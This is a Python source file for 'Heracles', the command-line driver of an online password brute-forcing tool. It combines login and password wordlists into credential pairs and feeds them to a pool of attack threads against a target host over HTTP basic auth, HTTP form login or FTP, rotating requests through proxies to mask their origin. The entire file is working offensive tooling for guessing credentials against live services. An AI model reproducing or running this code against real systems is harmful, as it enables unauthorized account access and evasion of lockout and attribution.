"""
Project:Heracles
Last-Edit:Fri 13 Jan 2012
Site:http://darkpy.net/python/Heracles/

Author(s):
    v0mit: v0mit@darkpy.net
"""

__version__ = "0.1"

import sys, argparse, logging, Queue, time, os
from attack_thread import AttackThread

class Heracles():
    def __init__(self):
        parser = argparse.ArgumentParser(description="Heracles v{0}".format(__version__))
        parser.add_argument("host", action="store",
            help="Target host.", default=False)

        parser.add_argument("protocol", action="store", default=False,
            help="Protocol: http-ba, http-form-post, ftp. See README for more information.")

        parser.add_argument("-f", "--form", action="store", dest="form",
            help="form", default=None)

        parser.add_argument("-t", "--threads", action="store", dest="max_threads",
            help="Max number of threads to use.", default=20, type=int)

        parser.add_argument("-l", "--logins", action="store", dest="logins_file",
            help="Path to file containing login.", default=None)

        parser.add_argument("-p", "--passwords", action="store", dest="passwd_file",
            help="Path to file containing passwords.", default=None)

        parser.add_argument("-d", "--dictionary", action="store", dest="dictionary_file",
            help="Path to file containing login:pass", default=None)

        parser.add_argument("-o", "--output", action="store", dest="output_file",
            help="Path to output file.", default=None)

        parser.add_argument("--verbose", action="store", dest="verbose",
            help="Set verbose level. DEBUG=10, INFO=20, WARNING=30, ERROR=40, CRITICAL=50. Default is 20.",
            default=False)

        parser.add_argument("-a", "--proxy-file", action="store", dest="proxy_file",
            help="Path to proxy file.", default=None)

        parser.add_argument("-A", "--proxy", action="store", dest="proxy",
            help="Proxy", default=None)

        results = parser.parse_args()
        self.options = {"host":results.host}
        self.options["form"] = results.form
        self.options["protocol"] = results.protocol
        self.options["max_threads"] = results.max_threads
        self.options["logins_file"] = results.logins_file
        self.options["passwd_file"] = results.passwd_file
        self.options["dictionary_file"] = results.dictionary_file
        self.options["output_file"] = results.output_file
        self.options["verbose"] = results.verbose
        self.options["proxy_file"] = results.proxy_file
        self.options["proxy"] = results.proxy

        if self.options.get("verbose"):
            self.logging_lvl = int(self.options.get("verbose"))
        else:
            self.logging_lvl = 20

        if self.logging_lvl == 10:
            logging.basicConfig(stream=sys.stderr, level=self.logging_lvl,
                format='[%(levelname)s] (%(thread)d) %(message)s')
        else:
            logging.basicConfig(stream=sys.stderr, level=self.logging_lvl,
                format='[%(levelname)s] %(message)s')

        #Checks if some of the shit is passed, if not exit.
        if not self.options.get("dictionary_file"):
            #Too long to fit on one line
            if not self.options.get("logins_file") and not self.options.get("passwd_file"):
                logging.error("No login/user or password files passed.")
                sys.exit(1)

        #If one of them is passed the other one should also be passed.
        if self.options.get("logins_file") or self.options.get("passwd_file"):
            if not self.options.get("passwd_file"):
                logging.error("Path to file containing password not passed.")
                sys.exit(1)

            if not self.options.get("logins_file"):
                logging.error("Path to file containing users/logins not passed.")
                sys.exit(1)

            if self.options.get("dictionary_file"):
                logging.error("Cannot use dictionary and login/password.")
                sys.exit(1)

        if self.options.get("output_file"):
            try:
                output_file = open(self.options.get("output_file"), "wb")
                output_file.close()
            except IOError as errno:
                logging.warning(errno)
                self.options["output_file"] = None



        self.loadLogins()
        self.loadProxies()

    def loadProxies(self):
        self.proxy = []

        if self.options.get("proxy") and self.options.get("proxy_file"):
            logging.error("Invalid use of proxy.")
            sys.exit(1)

        if self.options.get("proxy"):
            self.proxy = [self.options.get("proxy") for i in range(
                len(self.login_details))]
            return

        if self.options.get("proxy_file"):
            try:
                proxy_file = open(self.options.get("proxy_file"), "rb")
            except IOError as errno:
                logging.error(errno)
                sys.exit(1)

            while len(self.proxy) < len(self.login_details):
                for proxy in proxy_file:
                    self.proxy.append(proxy)

            return

        #Fill the list when no proxy is used.
        self.proxy = [None for i in range(len(self.login_details))]

    def loadLogins(self):
        self.login_details = []

        if self.options.get("passwd_file"):
            try:
                passwd_file = open(self.options.get("passwd_file"), "rb")
            except IOError as errno:
                logging.error(errno)
                sys.exit(1)

            try:
                logins_file = open(self.options.get("logins_file"), "rb")
            except IOError as errno:
                logging.error(errno)
                sys.exit(1)

            passwds = [passwd.strip() for passwd in passwd_file]
            for user in logins_file:
                user = user.strip()
                for passwd in passwds:
                    passwd = passwd
                    self.login_details.append((user, passwd))


            logging.info("{0} user:pass loaded.".format(
                len(self.login_details)))
            return

        try:
            dictionary_file = open(self.options.get("dictionary_file"), "rb")
        except IOError as errno:
            logging.error(errno)
            sys.exit(1)

        for details in dictionary_file:
            details = details.strip()
            try:
                user, passwd = details.split(":")
            except ValueError:
                continue

            self.login_details.append((user, passwd))

        logging.info("{0} user:pass loaded.".format(len(self.login_details)))

    def start(self):
        #Getting all files in Heracles/protocols directory
        protocolsl = os.listdir(os.path.join("Heracles", "protocols"))
        #Creating a list without the .py extension, ready for __import__
        protocolsl = map(lambda pro: pro.split(".py")[0], protocolsl)

        #Importing the modules and adding it to a dict, so it can be used
        protocols = {}
        for pro in protocolsl:
            protocols[pro] = __import__("Heracles.protocols."+pro, fromlist="*")

        #Checking if the protocol requested by the user is in the dict of loaded protocols.
        #Exits' if not.
        try:
            #Creates a attack_object that will be passed to the attack thread.
            attack_object = protocols.get(self.options.get("protocol")).AttackObject(
                self.options, l_lvl=self.logging_lvl)
        except KeyError:
            logging.error('Invalid protocol "{0}".'.format(
                self.options.get("protocol")))

        logging.info("Starting attack against {0}".format(
            self.options.get("host")))

        attack_queue = Queue.Queue()
        result_queue = Queue.Queue()

        #Creating AttackThread's
        pool = [AttackThread(attack_queue, attack_object,
            result_queue, l_lvl=self.logging_lvl)
            for i in range(
            self.options.get("max_threads"))]

        for thread in pool:
            thread.start()

        logging.info("{0} threads started.".format(
            self.options.get("max_threads")))

        idx = 0
        while True:
            try:
                attack_queue.put((self.login_details.pop(), self.proxy[idx]))
                idx += 1
            except IndexError as errno:
                break

            if idx == len(self.proxy):
                idx = 0

        while True:
            attack_queue.join()
            try:
                result = result_queue.get(True, 0.05)
            except Queue.Empty:
                break

            #If we are getting a PROXY FAIL and are using a single proxy, issue a
            #a warning.
            if result[0] == "PROXY FAIL" and self.options.get("proxy"):
                logging.warning("Seems like proxy or server is down.")

            #Put untested info back into queue.
            try:
                attack_queue.put((result[1], self.proxy[idx]))
            except IndexError as errno:
                break

            idx += 1
            if idx == len(self.proxy):
                idx = 0


if __name__ == "__main__":
    a = Heracles()
    a.start()